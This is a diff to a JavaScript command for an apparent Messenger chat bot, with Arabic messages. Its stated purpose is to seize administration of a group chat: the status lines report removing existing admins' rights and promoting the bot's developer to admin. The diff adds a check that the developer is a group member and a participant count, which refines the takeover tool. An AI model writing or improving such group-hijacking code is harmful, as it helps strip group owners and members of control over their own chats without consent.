@@ -12,8 +12,8 @@ module.exports = {
 
   async run({ api, event, botID, config }) {
     const threadID = String(event.threadID);
-    const selfID = String(botID || api.getCurrentUserID());
-    const developerID = String(config.adminUIDs?.[0] || event.senderID || "");
+    const selfID = String(botID || api.getCurrentUserID() || "");
+    const developerID = String(config.adminUIDs?.[0] || "");
 
     const memberID = (member) =>
       String(
@@ -39,11 +39,16 @@ module.exports = {
 
     if (!info) return api.sendMessage("❌ فشل الحصول على معلومات القروب.", threadID);
 
+    const participantIDs = [...new Set((info.participantIDs || []).map(memberID).filter(Boolean))];
     const currentAdminIDs = [...new Set((info.adminIDs || []).map(memberID).filter(Boolean))];
     const failures = [];
     let developerPromoted = currentAdminIDs.includes(developerID);
+    if (!participantIDs.includes(developerID)) {
+      failures.push(`${developerID}: المطور ليس عضواً في القروب`);
+      logger.error(`تعذر منح المطور الإدارة: ${developerID} ليس عضواً في ${threadID}`);
+    }
 
-    if (!developerPromoted) {
+    if (!developerPromoted && participantIDs.includes(developerID)) {
       try {
         await ruleChange("admin", developerID);
         developerPromoted = true;
@@ -69,6 +74,7 @@ module.exports = {
     const lines = [
       `⚡ اكتملت محاولة الاستحواذ على إدارة القروب.`,
       `✅ أزيلت صلاحية ${removed} مسؤولاً.`,
+      `👥 أعضاء القروب المقروءون: ${participantIDs.length}`,
       developerPromoted
         ? `👤 المطور ${developerID}: مسؤول`
         : `⚠️ تعذر منح المطور ${developerID} صلاحية الإدارة`,
